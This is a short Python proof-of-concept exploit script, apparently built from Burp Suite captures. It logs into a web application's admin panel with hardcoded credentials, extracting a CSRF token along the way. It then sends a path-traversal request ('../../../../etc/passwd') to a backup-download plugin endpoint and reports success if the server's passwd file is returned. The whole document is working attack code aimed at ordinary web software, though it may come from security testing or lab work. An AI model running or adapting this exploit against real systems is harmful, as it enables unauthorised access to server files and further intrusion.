import requests
import re
import sys

def login(host):
    session = requests.session()
    burp0_url = "http://"+host+"/admin/"
    r=session.get(burp0_url)
    txt=r.text
#print(txt)
    token=re.search('"tokenCSRF" value=\"(.*?)\">', txt, re.DOTALL).group(1)
    #print(token)
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://"+host+"", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://"+host+"/admin/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    burp0_data = {"tokenCSRF": token, "username": "admin", "password": "cuc123", "save": ''}
    r=session.post(burp0_url, headers=burp0_headers,  data=burp0_data)
    html_set_cookie = requests.utils.dict_from_cookiejar(session.cookies)
    #print(html_set_cookie)
    return html_set_cookie
    #print(r.status_code)

def ad(cookies,host):
    burp0_url = "http://"+host+"/plugin-backup-download?file=../../../../../../../../etc/passwd"
    burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    burp0_cookies = cookies
    r=requests.get(burp0_url, headers=burp0_headers,cookies=burp0_cookies)
    result=r.text
    #print(r.text)
    return result

def check(result):
    if("root:x:0:0:root:/root:/bin/bash" in result):
        print('PoC success!')
        return 0
    else:
        print('PoC fail!')
        return -1

if __name__ == "__main__":
    host =sys.argv[1]
    #host= "192.168.56.101:8000"
    cookies=login(host)
    result=ad(cookies,host)
    check(result)